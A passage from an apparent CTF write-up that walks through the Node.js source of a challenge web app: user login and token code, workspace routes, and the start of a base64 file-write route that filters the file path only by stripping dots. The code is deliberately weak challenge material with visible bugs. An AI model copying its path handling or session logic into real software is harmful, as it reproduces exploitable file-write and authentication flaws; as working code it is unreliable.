            <span class="na">pass</span> <span class="p">:</span> <span class="nx">crypto</span><span class="p">.</span><span class="nf">createHash</span><span class="p">(</span><span class="dl">'</span><span class="s1">sha512</span><span class="dl">'</span><span class="p">).</span><span class="nf">update</span><span class="p">(</span><span class="nx">pass</span> <span class="o">+</span> <span class="nx">salt</span><span class="p">).</span><span class="nf">digest</span><span class="p">(</span><span class="dl">'</span><span class="s1">hex</span><span class="dl">'</span><span class="p">),</span>
            <span class="na">workspaces</span> <span class="p">:</span> <span class="p">{},</span>
            <span class="na">base_dir</span><span class="p">:</span> <span class="nx">base_dir</span>
        <span class="p">};</span>
        <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">true</span><span class="p">});</span>
    <span class="p">});</span>
    
    <span class="nx">app</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/users</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">userid</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">userid</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">pass</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">pass</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">userid</span> <span class="o">||</span> <span class="o">!</span><span class="nx">token</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid userid or token</span><span class="dl">"</span><span class="p">});</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nf">check_session</span><span class="p">(</span><span class="nx">userid</span><span class="p">,</span> <span class="nx">token</span><span class="p">))</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to validate session</span><span class="dl">"</span><span class="p">});</span>
        
        <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">users</span><span class="p">[</span><span class="nx">userid</span><span class="p">];</span>

        <span class="nf">cleanup_user</span><span class="p">(</span><span class="nx">user</span><span class="p">);</span>
        <span class="k">delete</span> <span class="nx">user</span><span class="p">.</span><span class="nx">userid</span><span class="p">;</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">true</span><span class="p">});</span>
    <span class="p">});</span>

    
    <span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/users/auth</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">userid</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">userid</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">pass</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">pass</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">userid</span> <span class="o">||</span> <span class="o">!</span><span class="nx">pass</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid userid or password</span><span class="dl">"</span><span class="p">});</span>

        <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">users</span><span class="p">[</span><span class="nx">userid</span><span class="p">];</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">user</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to find user</span><span class="dl">"</span><span class="p">});</span>

        <span class="k">if</span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">pass</span> <span class="o">!=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nf">createHash</span><span class="p">(</span><span class="dl">'</span><span class="s1">sha512</span><span class="dl">'</span><span class="p">).</span><span class="nf">update</span><span class="p">(</span><span class="nx">pass</span> <span class="o">+</span> <span class="nx">salt</span><span class="p">).</span><span class="nf">digest</span><span class="p">(</span><span class="dl">'</span><span class="s1">hex</span><span class="dl">'</span><span class="p">))</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Incorrect password</span><span class="dl">"</span><span class="p">});</span>
        
        <span class="nx">token</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nf">randomBytes</span><span class="p">(</span><span class="mi">20</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="dl">'</span><span class="s1">hex</span><span class="dl">'</span><span class="p">);</span>
        <span class="nx">tokens</span><span class="p">[</span><span class="nx">token</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
            <span class="na">owner</span> <span class="p">:</span> <span class="nx">userid</span><span class="p">,</span>
            <span class="na">expire</span><span class="p">:</span> <span class="mi">30</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">+</span> <span class="nb">Date</span><span class="p">.</span><span class="nf">now</span><span class="p">()</span> <span class="o">/</span> <span class="mi">1000</span>
        <span class="p">};</span>
        <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">token</span><span class="p">:</span> <span class="nx">token</span><span class="p">});</span>
    <span class="p">});</span>
<span class="p">}</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">check_session</span> <span class="o">=</span> <span class="nx">check_session</span><span class="p">;</span>
<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">users</span> <span class="o">=</span> <span class="nx">users</span><span class="p">;</span>
<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">tokens</span> <span class="o">=</span> <span class="nx">tokens</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>
<p>user.js has a function to creating and deleting users and login. If it created user, it put user information into user object. And If login successful, it put user token into tokes object after creating the token using user id. In this point, important point is when it is creating user, it make <code class="language-plaintext highlighter-rouge">os.tmpdir()+appPrefix</code> as <code class="language-plaintext highlighter-rouge">base_dir</code>. So, default path of user is <code class="language-plaintext highlighter-rouge">/tmp*</code></p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">fs</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">path</span><span class="dl">"</span><span class="p">);</span>

<span class="kd">const</span> <span class="nx">user_module</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./user.js</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">check_session</span> <span class="o">=</span> <span class="nx">user_module</span><span class="p">.</span><span class="nx">check_session</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">users</span> <span class="o">=</span> <span class="nx">user_module</span><span class="p">.</span><span class="nx">users</span><span class="p">;</span>

<span class="kd">function</span> <span class="nf">cleanup_workspace</span><span class="p">(</span><span class="nx">base_dir</span><span class="p">,</span> <span class="nx">workspace</span><span class="p">){</span>
    <span class="k">for </span><span class="p">(</span><span class="kd">const</span> <span class="nx">f_path</span> <span class="k">in</span> <span class="nb">Object</span><span class="p">.</span><span class="nf">values</span><span class="p">(</span><span class="nx">workspace</span><span class="p">))</span> <span class="p">{</span>
        <span class="nx">fs</span><span class="p">.</span><span class="nf">rmSync</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nx">base_dir</span><span class="p">,</span> <span class="nx">f_path</span><span class="p">),</span> <span class="p">{</span><span class="na">recursive</span><span class="p">:</span> <span class="kc">true</span><span class="p">});</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nf">function </span><span class="p">(</span><span class="nx">app</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/users/:userid</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">id</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">userid</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">token</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">userid</span> <span class="o">||</span> <span class="o">!</span><span class="nx">token</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid userid or token</span><span class="dl">"</span><span class="p">});</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nf">check_session</span><span class="p">(</span><span class="nx">userid</span><span class="p">,</span> <span class="nx">token</span><span class="p">))</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to validate session</span><span class="dl">"</span><span class="p">});</span>

        <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">users</span><span class="p">[</span><span class="nx">userid</span><span class="p">];</span>
        <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">workspace</span><span class="p">:</span> <span class="nb">Object</span><span class="p">.</span><span class="nf">keys</span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">workspaces</span><span class="p">)});</span>
    <span class="p">});</span>

    <span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/users/:userid</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">userid</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">userid</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">token</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">ws_name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">ws_name</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">userid</span> <span class="o">||</span> <span class="o">!</span><span class="nx">token</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid userid or token</span><span class="dl">"</span><span class="p">});</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nf">check_session</span><span class="p">(</span><span class="nx">userid</span><span class="p">,</span> <span class="nx">token</span><span class="p">))</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to validate session</span><span class="dl">"</span><span class="p">});</span>

        <span class="nx">users</span><span class="p">[</span><span class="nx">userid</span><span class="p">].</span><span class="nx">workspaces</span><span class="p">[</span><span class="nx">ws_name</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
        <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">true</span><span class="p">});</span>
    <span class="p">});</span>

    <span class="nx">app</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/users/:userid</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">userid</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">userid</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">token</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">ws_name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">ws_name</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">userid</span> <span class="o">||</span> <span class="o">!</span><span class="nx">token</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid userid or token</span><span class="dl">"</span><span class="p">});</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nf">check_session</span><span class="p">(</span><span class="nx">userid</span><span class="p">,</span> <span class="nx">token</span><span class="p">))</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to validate session</span><span class="dl">"</span><span class="p">});</span>
        
        <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">users</span><span class="p">[</span><span class="nx">userid</span><span class="p">];</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">ws_name</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid workspace name</span><span class="dl">"</span><span class="p">});</span>

        <span class="kd">const</span> <span class="nx">workspace</span> <span class="o">=</span> <span class="nx">user</span><span class="p">.</span><span class="nx">workspaces</span><span class="p">[</span><span class="nx">ws_name</span><span class="p">];</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">workspace</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to find workspace</span><span class="dl">"</span><span class="p">});</span>

        <span class="nf">cleanup_workspace</span><span class="p">(</span><span class="nx">workspace</span><span class="p">);</span>
        <span class="k">delete</span> <span class="nx">user</span><span class="p">.</span><span class="nx">workspace</span><span class="p">.</span><span class="nx">ws_name</span><span class="p">;</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">true</span><span class="p">});</span>
    <span class="p">});</span>
<span class="p">}</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">cleanup_workspace</span> <span class="o">=</span> <span class="nx">cleanup_workspace</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>
<p>workspace.js too is similar with user.js: making, deleting workspace of user. here is no vulnerability too.</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">fs</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">path</span><span class="dl">"</span><span class="p">);</span>

<span class="kd">const</span> <span class="nx">user_module</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./user.js</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">check_session</span> <span class="o">=</span> <span class="nx">user_module</span><span class="p">.</span><span class="nx">check_session</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">users</span> <span class="o">=</span> <span class="nx">user_module</span><span class="p">.</span><span class="nx">users</span><span class="p">;</span>

<span class="kd">function</span> <span class="nf">write_b64_file</span><span class="p">(</span><span class="nx">f_path</span><span class="p">,</span> <span class="nx">contents</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">fs</span><span class="p">.</span><span class="nf">existsSync</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nf">dirname</span><span class="p">(</span><span class="nx">f_path</span><span class="p">)))</span>
            <span class="nx">fs</span><span class="p">.</span><span class="nf">mkdirSync</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nf">dirname</span><span class="p">(</span><span class="nx">f_path</span><span class="p">),</span> <span class="p">{</span><span class="na">recursive</span><span class="p">:</span> <span class="kc">true</span><span class="p">});</span>
        <span class="nx">fs</span><span class="p">.</span><span class="nf">writeFileSync</span><span class="p">(</span><span class="nx">f_path</span><span class="p">,</span> <span class="nx">contents</span><span class="p">,{</span><span class="na">encoding</span><span class="p">:</span> <span class="dl">'</span><span class="s1">base64</span><span class="dl">'</span><span class="p">});</span>
    <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">fs</span><span class="p">.</span><span class="nf">rmSync</span><span class="p">(</span><span class="nx">f_path</span><span class="p">,</span> <span class="p">{</span><span class="na">recursive</span><span class="p">:</span> <span class="kc">true</span><span class="p">});</span>
        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
  <span class="p">}</span>

<span class="kd">function</span> <span class="nf">read_b64_file</span><span class="p">(</span><span class="nx">f_path</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">try</span><span class="p">{</span>
        <span class="k">return</span> <span class="nx">fs</span><span class="p">.</span><span class="nf">readFileSync</span><span class="p">(</span><span class="nx">f_path</span><span class="p">,</span> <span class="p">{</span><span class="na">encoding</span><span class="p">:</span> <span class="dl">'</span><span class="s1">base64</span><span class="dl">'</span><span class="p">});</span>
    <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nf">function </span><span class="p">(</span><span class="nx">app</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/users/:userid/:ws</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">userid</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">userid</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">ws_name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">ws</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">token</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">userid</span> <span class="o">||</span> <span class="o">!</span><span class="nx">token</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid userid or token</span><span class="dl">"</span><span class="p">});</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nf">check_session</span><span class="p">(</span><span class="nx">userid</span><span class="p">,</span> <span class="nx">token</span><span class="p">))</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to validate session</span><span class="dl">"</span><span class="p">});</span>

        <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">users</span><span class="p">[</span><span class="nx">userid</span><span class="p">];</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">ws_name</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid workspace name</span><span class="dl">"</span><span class="p">});</span>

        <span class="kd">const</span> <span class="nx">workspace</span> <span class="o">=</span> <span class="nx">user</span><span class="p">.</span><span class="nx">workspaces</span><span class="p">[</span><span class="nx">ws_name</span><span class="p">];</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">workspace</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to find workspace</span><span class="dl">"</span><span class="p">});</span>
        
        <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">workspace</span><span class="p">:</span> <span class="nb">Object</span><span class="p">.</span><span class="nf">keys</span><span class="p">(</span><span class="nx">workspace</span><span class="p">)});</span>
    <span class="p">});</span>

    <span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/users/:userid/:ws</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">userid</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">userid</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">ws_name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">ws</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">token</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">f_name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">file_name</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">f_path</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">file_path</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">\.</span><span class="sr">/g</span><span class="p">,</span><span class="dl">''</span><span class="p">)</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
